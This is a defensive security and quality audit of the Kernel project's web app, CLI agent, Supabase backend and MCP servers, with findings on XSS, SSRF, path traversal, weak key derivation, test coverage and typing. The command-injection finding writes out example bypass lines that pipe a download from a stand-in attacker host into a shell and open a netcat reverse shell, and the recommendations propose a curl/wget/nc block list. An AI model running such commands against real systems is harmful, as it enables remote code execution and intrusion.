# Codebase Audit Report

**Date**: 2026-04-08
**Scope**: Full-stack audit of the Kernel project (web companion + K:BOT CLI + Supabase backend + tools/MCP servers)

---

## Executive Summary

The Kernel project is a large, ambitious codebase spanning a React 19 PWA, a 670+ tool CLI agent, a Supabase backend with 27+ edge functions, and multiple MCP servers/daemons. Overall architecture is sound, but the audit identified **12 high-severity**, **18 medium-severity**, and **15 low-severity** issues across security, type safety, test coverage, and configuration.

**Top 3 concerns:**
1. **Test coverage is critically low** — 10.7% in `src/`, 3.8% in `packages/`
2. **477 instances of `any` type usage** undermine TypeScript's strict mode
3. **Multiple security gaps** in CLI tools (command injection bypasses, SSRF redirect following, weak key derivation)

---

## I. Build & Configuration

### TypeScript

| Check | Status |
|-------|--------|
| `strict: true` | PASS |
| `@ts-ignore` / `@ts-nocheck` | PASS (0 found) |
| `tsc --noEmit` | WARN — 3 deprecation warnings (esModuleInterop, moduleResolution=node10, baseUrl) |
| Test files in tsconfig | FAIL — test files excluded from type checking |

**Issues:**
- **Deprecated TS options**: `esModuleInterop=false`, `moduleResolution=node10`, and `baseUrl` are deprecated in TS 5.9 and will break in TS 7.0. Add `"ignoreDeprecations": "6.0"` or migrate.
- **Test files excluded**: `src/**/*.test.ts` and `src/**/*.test.tsx` are excluded from `tsconfig.json`, meaning test code is never type-checked during builds.

### Vitest

| Check | Status |
|-------|--------|
| Config exists | PASS |
| Tests runnable | FAIL — `vitest` not in node_modules (dev dependency not installed) |
| Coverage thresholds | FAIL — no coverage config |
| Coverage provider | FAIL — not configured |

### Vite

| Check | Status |
|-------|--------|
| PWA config | PASS |
| Code splitting | PASS (manual chunks for React, Supabase, i18n, etc.) |
| Allowed hosts | WARN — personal Tailscale hostname hardcoded |

### Package.json

| Check | Status |
|-------|--------|
| Version | WARN — `0.0.0` vs Vite's `1.3.1` (mismatch) |
| Security overrides | PASS (undici, serialize-javascript, xml2js pinned) |
| Lockfile | PASS (package-lock.json present) |

### Misc

- **Orphaned `undefined` file** at repo root (0 bytes) — artifact of a broken file write operation. Should be deleted.
- **Missing ESLint config** — `eslint . --max-warnings 0` in scripts but no `.eslintrc.*` found.

---

## II. Security — Web App (`src/`)

### XSS Risk: `dangerouslySetInnerHTML` (4 instances)

| File | Line | Source | Risk |
|------|------|--------|------|
| `GoalsPanel.tsx` | 174 | `goal.description` with regex-based markdown | **MEDIUM** — user-controlled description parsed to HTML via regex without sanitization |
| `MessageContent.tsx` | 325, 553, 894 | `highlighted` (syntax-highlighted code) | **LOW** — output from highlight.js, generally safe |

**`GoalsPanel.tsx:174`** is the most concerning: it converts markdown-like syntax (`**bold**`, `*italic*`, `` `code` ``) to raw HTML using regex `.replace()` without escaping the input first. If `goal.description` contains `<script>` or event handlers, they pass through. **Fix**: Use `DOMPurify` or escape HTML entities before regex replacement.

### `eval()` Usage
**PASS** — 0 instances of `eval()` in `src/`.

### `any` Type Usage

| Pattern | Count |
|---------|-------|
| `: any` | 38 instances across 14 files |
| `as any` | 16 instances across 6 files |
| **Total** | **54 instances** in web app |

Worst offenders: `useUserFiles.ts` (7), `OnboardingFlow.test.tsx` (6), `useLiveShare.ts` (5), `useApiKeys.ts` (5), `useChatEngine.ts` (4).

---

## III. Security — K:BOT CLI (`packages/kbot/`)

### HIGH Severity

#### 1. Command Injection Bypass in `bash.ts`

**Lines 30-31**: Blocked command patterns only check for specific dangerous commands (`rm`, `mkfs`, `dd`, `shutdown`, `reboot`, `halt`) inside `$()` and backtick substitutions. Attackers can bypass with:
- `$(curl http://attacker.com | sh)` — not blocked
- `$(nc -e /bin/sh attacker.com 4444)` — not blocked
- Space/flag variations: `rm  -rf /` (double space), `rm --force --recursive`

#### 2. SSRF via Redirect Following in `fetch.ts`

**Line 117**: `redirect: 'follow'` with no hop limit. Attacker chain: public URL → redirect → `http://169.254.169.254/metadata` (cloud metadata). The DNS resolution check only validates the initial hostname, not redirect targets.

#### 3. Path Traversal in `files.ts`

**Lines 14-19**: `resolvePath()` resolves paths without bounding them to a safe directory. `/etc/passwd`, `../../../etc/shadow` all resolve successfully. No chroot or allowlist enforcement.

#### 4. Weak Encryption Key Derivation in `auth.ts`

**Lines 334-336**: API key encryption key derived from:
```
SHA256(homedir + ":" + USER + ":" + arch)
```
All three inputs are predictable. No salt, no iteration count. Should use PBKDF2 or scrypt with a random salt stored alongside the encrypted config.

### MEDIUM Severity

| Issue | File | Lines |
|-------|------|-------|
| Missing Zod validation on tool inputs | `tools/index.ts` | 35-53 |
| Error output leaks env vars/paths | `bash.ts` | 104-109 |
| Shell injection via hook env vars | `hooks.ts` | 50-56, 99 |
| DNS rebinding not fully mitigated | `fetch.ts` | 35-53 |
| Silent plaintext fallback on decrypt failure | `auth.ts` | 325 |
| Permission check mismatch (permissions.ts vs bash.ts) | `permissions.ts` | 68-86 |

---

## IV. Security — Supabase Backend

### HIGH Severity

#### 1. 27 Edge Functions with `--no-verify-jwt`

Functions deployed with `--no-verify-jwt` must manually validate JWTs. Any missing validation = unauthenticated access. Affected: `admin-invoice`, `author-profile`, `computer-engine`, `content-engine`, `content-moderation`, `create-checkout`, `discover-feed`, `engagement`, `export-user-data`, `forge-registry`, `identity-recovery`, `kbot-engine`, `kernel-api`, `knowledge-engine`, `live-share`, `platform-engine`, `pricing-engine`, `published-content`, `reset-user-data`, `send-notification`, `setup-billing-meter`, `social-analytics`, `social-auth`, `social-publish`, `tts`, `workspace-invite`.

#### 2. Service Role Key Fallback Exposure

`admin-send-file/index.ts:38`: Uses `SUPABASE_ANON_KEY || serviceKey` — falls back to the powerful service role key if anon key is missing.

### MEDIUM Severity

| Issue | File |
|-------|------|
| Timing-unsafe string comparison for webhook auth | `notify-webhook/index.ts:111-117` |
| Error info disclosure (raw API errors to client) | `web-search/index.ts:116`, `claude-proxy/index.ts:553` |
| Admin IDs in env var (no DB role verification) | `send-announcement/index.ts:19-21` |
| API key prefix leaks 20 chars (should be last 4) | `api-keys/index.ts:97` |
| Permissive RLS on conversations table | `002_conversations.sql:12-13` |
| IP spoofing in rate limiting (`x-forwarded-for`) | `shared-conversation/index.ts:31` |
| Email change without uniqueness check | `identity-recovery/index.ts:306-314` |

### Positive Findings
- CORS allowlist properly enforced
- Stripe webhook HMAC-SHA256 verification correct
- SSRF blocklist comprehensive
- RLS broadly enabled across tables
- Rate limiting backed by Postgres
- No SQL injection (parameterized RPC calls throughout)
- No hardcoded secrets (all via `Deno.env.get()`)

---

## V. Security — Tools & MCP Servers

### HIGH Severity

| Issue | File | Detail |
|-------|------|--------|
| Arbitrary JS execution via `page.evaluate()` | `browser-mcp.ts:95` | No sandbox, no validation |
| Credentials held in memory uncleared | `kbot-social-daemon.ts:36-46` | OAuth tokens as plain strings |
| Discord admin check uses only hardcoded IDs | `discord-bot.ts:1638-1641` | No guild role verification |

### MEDIUM Severity

| Issue | File |
|-------|------|
| 180s command timeout (too high) | `discord-bot.ts:1528` |
| Unvalidated JSON parsing (crash risk) | `kbot-discovery-daemon.ts:196`, `kbot-social-daemon.ts:196` |
| Filename traversal in admin file send | `kernel-admin-mcp.ts:193-200` |
| Fake Stripe IDs for admin grants | `kernel-admin-mcp.ts:278-279` |
| No rate limiting on admin MCP tools | `kernel-admin-mcp.ts` (all) |
| Error messages leaked to Discord users | `discord-bot.ts:1541` |

### Dockerfile

**PASS** — Alpine base, non-root user (`uid 1000`), health check present. Minor: should pin `@kernel.chat/kbot` version instead of `@latest`.

---

## VI. Test Coverage

### Coverage Summary

| Area | Test Files | Source Files | Coverage Ratio |
|------|-----------|--------------|----------------|
| `src/engine/` | 17 | 57 | 29.8% |
| `src/components/` | 4 | 120+ | 3.3% |
| `src/hooks/` | 5 | 30+ | 16.7% |
| `packages/kbot/tools/` | 12 | 40+ | 30% |
| `packages/kbot/` (other) | 15 | 150+ | 10% |
| **E2E (Playwright)** | 8 specs | — | Shallow |

### Critical Gaps (No Tests)

**Core engines** (0 tests): `AIEngine.ts`, `MasterAgent.ts`, `SwarmOrchestrator.ts`, `SystemEngine.ts`, `ClaudeClient.ts`, `SupabaseClient.ts`, `TaskPlanner.ts`, `KnowledgeEngine.ts`

**UI components** (4/120+ tested): Only `MoreMenu`, `NotificationBell`, `BottomTabBar`, `OnboardingFlow` have tests.

**Stores** (0/14 tested): `discoveryStore`, `computerStore`, `platformStore`, `knowledgeStore`, `autonomousStore`, `adaptiveStore`, `masterStore`, `contentStore`, `socialStore`, `pricingStore`, `agentStore`, `communicationStore`, `companionStore` — all untested.

### E2E Quality
Tests are mostly existence checks (`waitForSelector`, `isDisabled`). No actual business logic testing, no mock API responses in most specs.

### Vitest Coverage Config
**Missing entirely** — no `coverage.provider`, `coverage.all`, `coverage.lines`, or threshold enforcement.

---

## VII. Type Safety

| Metric | Count | Status |
|--------|-------|--------|
| `: any` annotations | 290 (packages) + 38 (src) = **328** | CRITICAL |
| `as any` assertions | 169 (packages) + 16 (src) = **185** | CRITICAL |
| `<any>` generics | 18 | MODERATE |
| `@ts-ignore` | 0 | GOOD |
| `@ts-nocheck` | 0 | GOOD |
| `strict: true` | Enabled | GOOD |

Common pattern: `catch (err: any)` accounts for ~290 instances. Replace with `catch (err: unknown)` and use type narrowing.

---

## VIII. Recommendations (Priority Order)

### Immediate (This Week)

1. **Sanitize `dangerouslySetInnerHTML` in `GoalsPanel.tsx`** — escape HTML entities before regex markdown conversion, or use DOMPurify
2. **Fix SSRF redirect following in `fetch.ts`** — validate redirect target IPs, limit redirect hops
3. **Expand command injection blocklist in `bash.ts`** — block `curl|wget|nc|ncat` in subshells, or switch to allowlist approach
4. **Fix service key fallback in `admin-send-file`** — fail with error instead of falling back to service role key
5. **Use timing-safe comparison in `notify-webhook`** — `crypto.subtle.timingSafeEqual()` instead of `===`
6. **Delete orphaned `undefined` file** at repo root

### Short-Term (This Sprint)

7. **Add Vitest coverage config** — set thresholds (target 60%+ lines), configure coverage provider
8. **Add tests for core engines** — `ClaudeClient.ts`, `MasterAgent.ts`, `SwarmOrchestrator.ts` at minimum
9. **Replace `catch (err: any)` with `catch (err: unknown)`** — systematic cleanup across codebase
10. **Strengthen key derivation in `auth.ts`** — use PBKDF2/scrypt with random salt
11. **Audit all 27 `--no-verify-jwt` edge functions** — verify each manually validates auth
12. **Add path bounding to `files.ts`** — restrict `resolvePath()` to project directory
13. **Fix deprecated TypeScript options** — migrate away from deprecated `esModuleInterop`, `moduleResolution`, `baseUrl`

### Medium-Term (Next Month)

14. **Reduce `any` usage** — target < 50 instances (from 477)
15. **Add store tests** — all 14 Zustand stores need at minimum smoke tests
16. **Improve E2E tests** — add API mocking, test actual user flows not just element existence
17. **Add rate limiting to MCP servers** — especially `kernel-admin-mcp.ts`
18. **Add Zod schema validation to CLI tool inputs** — Zod is already a dependency but unused for tool input validation
19. **Reduce Discord bot command timeout** — 180s → 30s, add ulimit
20. **Fix version mismatch** — align `package.json` version with Vite build version
21. **Add ESLint config file** — script references lint but no config file found

---

## IX. What's Working Well

- **Security fundamentals are solid**: No `.env` committed, `.gitignore` comprehensive, strict TS enabled, no `eval()` in web app
- **Supabase backend**: CORS allowlist, SSRF blocklist, Stripe webhook verification, RLS broadly enabled, parameterized queries
- **Architecture**: Clean separation between CLI/web/backend, monorepo structure, MCP server isolation
- **Dockerfile**: Non-root user, Alpine base, health checks
- **Code splitting**: Vite manual chunks well-configured for performance
- **PWA**: Service worker with manifest injection properly configured

---

*Generated by codebase audit on 2026-04-08*
